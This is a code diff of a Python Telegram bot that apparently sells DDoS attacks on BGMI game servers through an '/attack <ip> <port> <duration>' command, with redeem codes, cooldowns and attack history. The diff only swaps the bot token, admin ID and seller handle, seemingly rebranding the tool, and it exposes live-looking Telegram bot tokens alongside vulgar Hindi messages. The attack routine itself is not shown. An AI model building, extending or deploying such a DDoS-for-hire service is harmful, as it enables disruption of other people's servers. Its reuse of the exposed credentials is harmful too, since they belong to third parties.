@@ -19,8 +19,8 @@ db = client['Anurag']
 users_collection = db['VAMPIREXCHEATS']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7651280704:AAG8E5rEQkxYLAaNGTc6G6WvHKDAEeoM1XM'
-ADMIN_USER_ID = 7509496491 
+TELEGRAM_BOT_TOKEN = '7753078487:AAEOhMK4-gujQ_8GZO8X5Y4AJtZ7Q5kPdqI'
+ADMIN_USER_ID = 6290531180 
 
 cooldown_dict = {}
 user_attack_history = {}
@@ -54,12 +54,12 @@ async def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id  
     user_name = update.effective_user.first_name  
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @LDX_COBRA! /get_id*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @Mr_manu_kumar! /get_id*", parse_mode='Markdown')
         return
     message = (
        "*WELCOME 🤗 TO Anurag DDOS WORLD *\n\n"
         "*💀Use /attack <ip> <port> <duration>*\n"
-        "*💀sever ki chudayi @LDX_COBRA 🚀*" 
+        "*💀sever ki chudayi @Mr_manu_kumar 🚀*" 
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -148,11 +148,11 @@ async def attack(update: Update, context: CallbackContext):
     await context.bot.send_message(
         chat_id=chat_id,
         text=(
-            f"*😧 ANURAG 🥵SEVER FREEZ!❗ 💀*\n"
+            f"*😧 MANU🥵SEVER FREEZ!❗ 💀*\n"
         f"💦chodna shuru*!* 💦\n\n"
         f"*🤯 flat room: {ip}:{port}*\n"
         f"*🤣 kitne der: {duration} seconds*\n"
-        f"*🔥chudai chalu h feedback bhej dena @LDX_COBRA💥*"
+        f"*🔥chudai chalu h feedback bhej dena @Mr_manu_kumar💥*"
     ), parse_mode='Markdown')
 
     # Run attack asynchronously
@@ -178,7 +178,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @LDX_COBRA!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @Mr_manu_kumar!*", parse_mode='Markdown')
 
 async def generate_redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
